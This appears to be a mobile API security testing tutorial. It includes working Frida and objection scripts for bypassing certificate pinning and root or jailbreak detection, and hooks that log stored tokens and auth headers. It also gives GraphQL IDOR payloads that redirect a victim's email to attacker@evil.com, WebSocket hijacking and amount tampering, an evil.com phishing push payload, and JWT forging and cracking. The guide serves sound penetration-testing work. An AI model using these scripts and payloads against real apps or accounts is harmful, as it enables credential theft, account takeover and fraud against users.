# Mobile API Security Testing Guide

## Learning Objectives

Master advanced API security testing techniques specific to mobile applications, including certificate pinning bypass, GraphQL exploitation from mobile clients, WebSocket security, and mobile-specific authentication attack scenarios.

---

## 1. Certificate Pinning Bypass Advanced

### 1.1 Frida-Based Bypass Techniques

Mobile apps implement certificate pinning in various ways. Each implementation requires a specific bypass approach.

**Technique 1: TrustManager Replacement (Generic Java)**

```javascript
// Frida: Universal TrustManager bypass
Java.perform(function() {
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    // Create a permissive TrustManager
    var TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() {
                return [];
            }
        }
    });

    // Override SSLContext.init to inject permissive TrustManager
    SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation = function(km, tm, sr) {
        console.log("[+] SSLContext.init intercepted - injecting permissive TrustManager");
        this.init(km, [TrustManager.$new()], sr);
    };
});
```

**Technique 2: OkHttp CertificatePinner Clear**

```javascript
// Frida: Clear OkHttp certificate pinner pins
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");

    CertificatePinner.$init.overload("java.util.Set", "java.lang.String").implementation = function(pins, id) {
        console.log("[+] OkHttp CertificatePinner pins cleared");
        this.$init(Java.use("java.util.HashSet").$new(), id);
    };

    // Alternative: Hook the check method directly
    CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(hostname, peerCertificates) {
        console.log("[+] CertificatePinner.check bypassed for: " + hostname);
    };
});
```

**Technique 3: WebViewClient SSL Error Handler**

```javascript
// Frida: Bypass SSL error handling in WebView
Java.perform(function() {
    var WebViewClient = Java.use("android.webkit.WebViewClient");

    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
        console.log("[+] WebView SSL error bypassed: " + error.getUrl());
        handler.proceed();
    };
});
```

**Technique 4: Retrofit/Custom SSL Pinning**

```javascript
// Frida: Hook custom SSL pinning implementations
Java.perform(function() {
    // NetworkSecurityConfiguration (Android 7+)
    var NetworkSecurityConfig = Java.use("android.security.net.config.NetworkSecurityConfig");

    // Custom CertificateVerifier
    try {
        var CertificateVerifier = Java.use("com.target.app.security.CertificateVerifier");
        CertificateVerifier.verify.implementation = function(cert) {
            console.log("[+] Custom CertificateVerifier bypassed");
            return true;
        };
    } catch(e) {
        console.log("[-] No custom CertificateVerifier found");
    }
});
```

### 1.2 Objection Automation Scripts

```bash
# Objection: Universal SSL pinning bypass
objection -g com.target.app explore

# Inside objection shell:
# Disable multiple pinning implementations at once
android sslpinning disable

# Explore SSL-related classes
android hooking search classes ssl
android hooking search classes TrustManager
android hooking search classes CertificatePinner

# Hook specific SSL methods for monitoring
android hooking watch class_method okhttp3.CertificatePinner.check --dump-args --dump-return
```

**Objection Script for Batch Pinning Bypass**:

```javascript
// Save as ssl_bypass.js and load with objection
// objection -g com.target.app explore --startup-script ssl_bypass.js

// Bypass common pinning libraries
var pinningLibraries = [
    "com.datatheorem.android.trustkit.TrustKit",
    "com.squareup.okhttp.CertificatePinner",
    "okhttp3.CertificatePinner",
    "com.android.org.conscrypt.TrustManagerImpl",
    "org.apache.http.conn.ssl.SSLSocketFactory"
];

Java.perform(function() {
    pinningLibraries.forEach(function(lib) {
        try {
            var clazz = Java.use(lib);
            console.log("[+] Found pinning library: " + lib);
        } catch(e) {
            // Library not present
        }
    });
});
```

### 1.3 Flutter-Specific Pinning Bypass

Flutter uses its own BoringSSL-based networking stack, making standard Java-level bypasses ineffective.

```bash
# Method 1: reFlutter approach
# reFlutter patches the Dart engine to disable SSL verification
pip3 install reflutter
reflutter app.apk

# The patched APK intercepts all SSL connections
adb install app.reflutter.apk

# Method 2: Binary patching libflutter.so
# Find ssl_verify_peer_cert in libflutter.so and patch to return true
strings libflutter.so | grep -i "ssl_verify\|verify_peer"
```

**Frida Script for Flutter SSL Bypass (Android)**:

```javascript
// Hook at the native level for Flutter
Interceptor.attach(Module.findExportByName("libflutter.so", "ssl_verify_peer_cert"), {
    onEnter: function(args) {
        console.log("[+] ssl_verify_peer_cert called");
    },
    onLeave: function(retval) {
        console.log("[+] Original return value: " + retval);
        retval.replace(1); // Return success
        console.log("[+] Patched to return 1 (success)");
    }
});
```

### 1.4 Root/Jailbreak Detection Bypass Before Pinning Bypass

Many apps refuse to function on rooted/jailbroken devices before SSL pinning can be bypassed.

**Android Root Detection Bypass**:

```javascript
// Frida: Universal root detection bypass
Java.perform(function() {
    // Bypass file-based checks
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootIndicators = [
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su",
            "/magisk"
        ];
        if (rootIndicators.indexOf(path) >= 0) {
            console.log("[+] Root check bypassed for: " + path);
            return false;
        }
        return this.exists();
    };

    // Bypass PackageManager root app checks
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    PackageManager.getPackageInfo.overload("java.lang.String", "int").implementation = function(name, flags) {
        var rootPackages = ["eu.chainfire.supersu", "com.topjohnwu.magisk", "com.noshufou.android.su"];
        if (rootPackages.indexOf(name) >= 0) {
            console.log("[+] Root package check bypassed for: " + name);
            throw Java.use("android.content.pm.PackageManager$NameNotFoundException").$new(name);
        }
        return this.getPackageInfo(name, flags);
    };
});
```

**iOS Jailbreak Detection Bypass**:

```javascript
// Frida: iOS jailbreak detection bypass
var jailbreakPaths = [
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd",
    "/etc/apt",
    "/private/var/lib/apt"
];

// Hook file existence checks
var FileManager = ObjC.classes.NSFileManager;
Interceptor.attach(FileManager["- fileExistsAtPath:"].implementation, {
    onLeave: function(retval) {
        // Override jailbreak path checks
    }
});

// Hook canOpenURL checks (used to detect Cydia scheme)
var UIApplication = ObjC.classes.UIApplication;
Interceptor.attach(UIApplication["- canOpenURL:"].implementation, {
    onLeave: function(retval) {
        var urlStr = new ObjC.Object(ObjC.Object(this).URL).toString();
        if (urlStr.indexOf("cydia") >= 0) {
            retval.replace(0);
        }
    }
});
```

---

## 2. GraphQL Mobile Security

### 2.1 Introspection Query Extraction from Mobile Apps

```bash
# Step 1: Intercept GraphQL requests via proxy (after pinning bypass)
# Look for GraphQL endpoints in traffic
# Common paths: /graphql, /api/graphql, /v1/graphql

# Step 2: Run introspection query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <extracted_token>" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Step 3: Extract from mobile app binary
# React Native
grep -n "graphql\|__schema\|query\|mutation" index.android.bundle | head -50

# Flutter
strings libapp.so | grep -iE "graphql|__schema|mutation" | sort -u
```

**Frida: Hook GraphQL Client on Mobile**:

```javascript
// Hook Apollo GraphQL client (common in React Native)
Java.perform(function() {
    try {
        var ApolloClient = Java.use("com.apollographql.apollo.ApolloClient");
        console.log("[+] Apollo GraphQL client found");
    } catch(e) {}

    // Monitor all GraphQL traffic via OkHttp
    var RealCall = Java.use("okhttp3.internal.connection.RealCall");
    RealCall.execute.implementation = function() {
        var request = this.request();
        var url = request.url().toString();
        if (url.indexOf("graphql") >= 0) {
            console.log("[+] GraphQL request to: " + url);
            var body = request.body();
            if (body !== null) {
                var Buffer = Java.use("okio.Buffer");
                var buffer = Buffer.$new();
                body.writeTo(buffer);
                console.log("[+] GraphQL payload: " + buffer.readUtf8());
            }
        }
        return this.execute();
    };
});
```

### 2.2 Mutation Abuse (Data Manipulation Through Mobile API)

```bash
# Extract mutation operations from mobile app
# Look for mutation definitions in intercepted traffic

# Test mutation IDOR: Change the ID parameter to another user
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"query":"mutation { updateProfile(userId: \"VICTIM_ID\", email: \"attacker@evil.com\") { success } }"}'
```

**Batch Mutation Attack**:

```bash
# Send multiple mutations in a single request
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '[{"query":"mutation { sendMessage(to: \"user1\", text: \"spam\") { id } }"},
       {"query":"mutation { sendMessage(to: \"user2\", text: \"spam\") { id } }"},
       {"query":"mutation { sendMessage(to: \"user3\", text: \"spam\") { id } }"}]'
```

### 2.3 Batch Query Attacks

```bash
# Query batching - send many queries in one HTTP request
# This bypasses per-request rate limiting

# Generate batch query payload
python3 -c "
import json
queries = []
for i in range(100):
    queries.append({
        'query': '{ user(id: \"' + str(i) + '\") { email phone address } }'
    })
print(json.dumps(queries))
" > batch_query.json

# Send batch query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d @batch_query.json

# Measure response to detect depth limit issues
time curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { id } } } } } }"}'
```

### 2.4 Subscription and WebSocket Exploitation

```bash
# GraphQL subscriptions use WebSocket connections
# Common libraries: subscriptions-transport-ws, graphql-ws

# Connect to GraphQL WebSocket
wscat -c "wss://api.target.com/graphql" \
  -H "Authorization: Bearer <token>" \
  -x '{"type":"connection_init","payload":{}}'

# Subscribe to sensitive data
wscat -c "wss://api.target.com/graphql" \
  -x '{"type":"start","id":"1","payload":{"query":"subscription { newOrders { id amount user { email } payment { cardNumber } } }"}}'

# Test unauthorized subscription access
wscat -c "wss://api.target.com/graphql" \
  -H "Authorization: Bearer <regular_user_token>" \
  -x '{"type":"start","id":"1","payload":{"query":"subscription { adminNotifications { message severity } }"}}'
```

---

## 3. WebSocket Security

### 3.1 Mobile WebSocket Connection Hijacking

```bash
# Step 1: Identify WebSocket connections in intercepted traffic
# Look for Upgrade: websocket headers

# Step 2: Extract connection URL and authentication tokens
# Common patterns:
# wss://api.target.com/ws?token=<jwt>
# wss://api.target.com/ws (auth via first message)

# Step 3: Hijack the connection
wscat -c "wss://api.target.com/ws?token=<stolen_token>"

# Step 4: Test if connection is bound to session/IP
# If successful, the server does not validate connection source
```

**Frida: Extract WebSocket Connection Details**:

```javascript
// Hook OkHttp WebSocket on Android
Java.perform(function() {
    var WebSocket = Java.use("okhttp3.internal.ws.RealWebSocket");

    WebSocket.send.implementation = function(text) {
        console.log("[+] WebSocket send: " + text);
        return this.send(text);
    };

    // Hook WebSocket URL construction
    var Request = Java.use("okhttp3.Request");
    Request.url.overload().implementation = function() {
        var url = this.url().toString();
        if (url.startsWith("ws")) {
            console.log("[+] WebSocket URL: " + url);
        }
        return this.url();
    };
});
```

### 3.2 Message Manipulation and Injection

```bash
# Intercept and modify WebSocket messages using Burp Suite
# 1. Configure Burp as upstream proxy for WebSocket traffic
# 2. Enable WebSocket history in Proxy tab
# 3. Right-click message -> "Send to Repeater" for modification

# Manual message injection via wscat
wscat -c "wss://api.target.com/ws?token=<token>"

# Test JSON injection
> {"action":"transfer","amount":1000,"to":"attacker@evil.com","from":"victim@target.com"}

# Test type confusion
> {"action":"update_role","user_id":"123","role":"admin"}
```

**Frida: Real-Time Message Manipulation**:

```javascript
// Intercept and modify WebSocket messages in real-time
Java.perform(function() {
    var RealWebSocket = Java.use("okhttp3.internal.ws.RealWebSocket");

    RealWebSocket.send.implementation = function(text) {
        try {
            var msg = JSON.parse(text);
            console.log("[+] Original message: " + text);

            // Example: Modify amount in financial transaction
            if (msg.hasOwnProperty("amount")) {
                msg.amount = "0.01";
                var modified = JSON.stringify(msg);
                console.log("[+] Modified message: " + modified);
                return this.send(modified);
            }
        } catch(e) {}
        return this.send(text);
    };
});
```

### 3.3 Authentication Token Theft via WebSocket

```bash
# Many mobile apps send auth tokens as the first WebSocket message
# or include tokens in query parameters

# Pattern 1: Token in query parameter (extractable from URL)
# wss://api.target.com/ws?auth_token=<jwt>

# Pattern 2: Token in first message
wscat -c "wss://api.target.com/ws"
# First message received/sent often contains the token

# Pattern 3: Token in custom header during handshake
# Use Burp or mitmproxy to capture upgrade request headers
```

**Token Location Risk Assessment**:

| Token Location | Extraction Method | Risk Level |
|----------------|-------------------|------------|
| URL query parameter | Proxy log / traffic capture | HIGH - logged in server access logs |
| First WebSocket message | wscat / Frida hook | HIGH - visible if connection intercepted |
| HTTP header during upgrade | Burp Suite / mitmproxy | MEDIUM - only during handshake |
| Cookie during handshake | Burp Suite | MEDIUM - same as HTTP cookies |
| Re-issued per message | Frida message hook | CRITICAL - continuous exposure |

### 3.4 Server Push Attack Surface

```bash
# Mobile apps often trust server-push data without validation

# If you can control server responses (e.g., MITM after pinning bypass):
# 1. Inject malformed JSON to crash the app
# 2. Send oversized payloads to test buffer handling
# 3. Inject XSS payloads if data is rendered in WebView
# 4. Send commands the app will execute without verification

# Test push notification data handling
# Firebase Cloud Messaging payload injection:
{
    "to": "<device_token>",
    "data": {
        "action": "open_url",
        "url": "https://evil.com/phishing",
        "title": "Security Alert",
        "body": "Click to verify your account"
    }
}
```

---

## 4. API Rate Limiting and Auth Testing

### 4.1 Mobile API Key Extraction

```bash
# Common locations for API keys in mobile apps:

# 1. Hardcoded in source code (React Native bundle)
grep -onE "AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}" index.android.bundle

# 2. In Android resources
grep -rn "api_key\|apikey\|API_KEY" app_source/res/values/strings.xml

# 3. In BuildConfig
grep -rn "BuildConfig\.[A-Z_]*KEY\|BuildConfig\.[A-Z_]*TOKEN" app_source/smali*/

# 4. In SharedPreferences (runtime)
adb shell "run-as com.target.app cat shared_prefs/*.xml" | grep -iE "api_key|token|secret"

# 5. In Flutter snapshot
strings libapp.so | grep -E "AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}"
```

**API Key Validation Testing**:

```bash
# Test extracted API keys for missing restrictions

# Google API key test
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=<extracted_key>"

# AWS access key test
aws sts get-access-key-info --access-key-id <extracted_key>

# Stripe key test (if starts with sk_live_)
curl https://api.stripe.com/v1/charges \
  -u "<extracted_key>:"
```

### 4.2 JWT Manipulation on Mobile

```bash
# Step 1: Extract JWT from mobile traffic or storage
# Common locations: Authorization header, AsyncStorage, SharedPreferences, Keychain

# Step 2: Decode JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Step 3: Test common JWT vulnerabilities

# Test 1: Algorithm confusion (RS256 -> HS256)
# Modify header to use HS256 and sign with the public key

# Test 2: None algorithm
python3 -c "
import jwt
payload = {'sub': 'admin', 'role': 'administrator'}
token = jwt.encode(payload, '', algorithm='none')
print(token)
"

# Test 3: JWT secret brute force
hashcat -m 16500 jwt_token.txt wordlist.txt
```

**Frida: JWT Interception on Mobile**:

```javascript
// Hook JWT handling in the mobile app
Java.perform(function() {
    // Hook SharedPreferences for token storage
    var SharedPreferences = Java.use("android.app.SharedPreferencesImpl");
    SharedPreferences.getString.implementation = function(key, defaultValue) {
        var result = this.getString(key, defaultValue);
        if (key.toLowerCase().indexOf("token") >= 0 || key.toLowerCase().indexOf("jwt") >= 0) {
            console.log("[+] JWT/Token retrieved - Key: " + key);
            console.log("[+] Token value: " + result);
        }
        return result;
    };

    // Hook OkHttp Authorization header
    var Builder = Java.use("okhttp3.Request$Builder");
    Builder.header.implementation = function(name, value) {
        if (name.toLowerCase() === "authorization") {
            console.log("[+] Authorization header: " + value);
        }
        return this.header(name, value);
    };
});
```

### 4.3 OAuth Token Theft Scenarios

```bash
# Scenario 1: Authorization code interception
# If PKCE is not implemented, intercept the auth code
# Monitor: app_scheme://callback?code=AUTH_CODE

# Scenario 2: Token leakage via referrer
# When the app opens external links, check if the referrer contains tokens
adb shell am start -a android.intent.action.VIEW -d "https://api.target.com/auth/callback?token=LEAKED"

# Scenario 3: Token storage in insecure locations
adb shell "run-as com.target.app find /data/data/com.target.app/ -name '*.xml' -o -name '*.db'" 2>/dev/null
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml" 2>/dev/null | grep -i token

# Scenario 4: Token not invalidated on logout
# Capture a valid token, then logout, then replay the token
curl -H "Authorization: Bearer <captured_token>" https://api.target.com/user/profile
```

**OAuth Flow Testing Checklist**:

| Test | Description | Expected Secure Behavior |
|------|-------------|-------------------------|
| PKCE enforcement | Auth code flow must use PKCE on mobile | Server rejects requests without code_verifier |
| Redirect URI validation | Only registered URIs accepted | Server rejects unregistered redirect URIs |
| Token scope | Token has minimum required scope | Narrow scope, no privilege escalation possible |
| Token expiry | Tokens expire within reasonable time | Access token < 1hr, refresh token rotation |
| Token revocation | Logout invalidates all tokens | Server blacklists revoked tokens |
| State parameter | CSRF protection in auth flow | Server validates state matches original request |

### 4.4 API Versioning Exploitation

```bash
# Many mobile apps support multiple API versions
# Older versions often have fewer security controls

# Step 1: Identify API versioning scheme
# Common patterns:
# - URL path: /api/v1/ vs /api/v2/
# - Header: API-Version: 1
# - Query parameter: ?version=1

# Step 2: Test older API versions for security regressions
curl https://api.target.com/api/v1/login -d "user=admin&pass=test" -v

# V2 has input validation, V1 does not
curl -X POST https://api.target.com/api/v1/user \
  -H "Authorization: Bearer <token>" \
  -d '{"email":"admin@target.com","role":"admin"}'

# Step 3: Check for undocumented API versions
for v in v0 v1 v2 v3 v4 beta alpha internal; do
    status=$(curl -s -o /dev/null -w "%{http_code}" https://api.target.com/api/$v/user)
    echo "API version $v: HTTP $status"
done
```

**Frida: API Version Downgrade on Mobile**:

```javascript
// Intercept and modify API version in mobile requests
Java.perform(function() {
    var HttpURLConnection = Java.use("java.net.URL");
    HttpURLConnection.openConnection.overload().implementation = function() {
        var originalUrl = this.toString();
        if (originalUrl.indexOf("/api/v2/") >= 0) {
            var downgradedUrl = originalUrl.replace("/api/v2/", "/api/v1/");
            console.log("[+] API downgraded: " + originalUrl + " -> " + downgradedUrl);
        }
        return this.openConnection();
    };
});
```

---

## 5. Testing Methodology

### 5.1 Complete Mobile API Testing Flow

```
1. Traffic Interception Setup
   |-> Bypass certificate pinning (see Section 1)
   |-> Configure Burp Suite / mitmproxy
   |-> Verify all API traffic is captured
   |
2. API Discovery
   |-> Catalog all endpoints from traffic
   |-> Identify authentication mechanisms
   |-> Map request/response schemas
   |
3. Authentication Testing
   |-> Extract and analyze JWT tokens
   |-> Test OAuth flow implementations
   |-> Check API key exposure
   |-> Test token lifecycle (creation, refresh, revocation)
   |
4. API Security Testing
   |-> Test GraphQL-specific attacks
   |-> Test WebSocket security
   |-> Test rate limiting and versioning
   |-> Check for IDOR and access control issues
   |
5. Report & Document
   |-> All discovered endpoints with test results
   |-> Authentication bypass findings
   |-> API-specific vulnerabilities
   |-> Remediation recommendations
```

### 5.2 Quick Reference: Bypass Priority

| Defense | Bypass Priority | Primary Tool |
|---------|----------------|--------------|
| Root detection | Bypass FIRST (blocks all testing) | Frida |
| Certificate pinning | Bypass SECOND (blocks traffic capture) | Frida / objection |
| Anti-debug | Bypass THIRD (blocks dynamic analysis) | Frida spawn mode |
| Token binding | Test with token replay | curl / Burp |

---

## 6. Tool Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **Frida** | Runtime SSL/auth bypass | `frida -U -f com.target.app -l bypass.js` |
| **objection** | Automated pinning bypass | `objection -g com.target.app explore` |
| **reFlutter** | Flutter SSL bypass | `reflutter app.apk` |
| **wscat** | WebSocket testing | `wscat -c wss://target/ws` |
| **Burp Suite** | Traffic interception | Configure proxy + install CA |
| **hashcat** | JWT secret cracking | `hashcat -m 16500 token.txt wordlist` |
| **inql** | GraphQL testing | `inql -t https://api.target.com/graphql` |
| **jwt_tool** | JWT manipulation | `python3 jwt_tool.py <token>` |

---

## References

- [OWASP MSTG - Network Testing](https://owasp.org/www-project-mobile-security-testing-guide/) - Mobile network security testing
- [Frida CodeShare](https://codeshare.frida.re/) - Community Frida scripts for SSL bypass
- [GraphQL Security Testing](https://graphql.org/learn/security/) - GraphQL security best practices
- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool) - JWT vulnerability testing
- [WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Cheat_Sheet.html) - OWASP WebSocket guide
